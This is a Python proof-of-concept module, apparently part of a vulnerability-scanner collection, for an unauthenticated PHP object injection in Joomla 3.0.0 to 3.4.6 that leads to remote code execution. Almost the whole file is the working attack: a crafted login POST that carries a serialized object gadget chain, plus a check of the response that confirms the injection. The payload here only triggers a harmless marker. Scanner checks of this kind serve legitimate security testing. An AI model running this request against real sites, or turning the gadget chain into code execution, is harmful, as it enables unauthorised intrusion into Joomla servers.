import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Rusty Joomla RCE - Unauthenticated PHP Object Injection in Joomla CMS''',
        "description": '''Unauthenticated PHP Object Injection in Joomla CMS from the release 3.0.0 to the 3.4.6 (releases from 2012 to December 2015) that leads to Remote Code Execution.''',
        "severity": "critical",
        "references": [
            "https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/", 
            "https://github.com/kiks7/rusty_joomla_rce"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["joomla", "rce", "unauth", "php", "cms", "objectinjection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "POST"
        data = """username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3BO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A7%3A%22print_r%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A40%3A%22http%3A%2F%2Frusty.jooml%2F%3Bpkwxhxqxmdkkmscotwvh%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login&{{csrf}}=1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""http://rusty.jooml/;pkwxhxqxmdkkmscotwvh""" in resp1.text and """Failed to decode session object""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url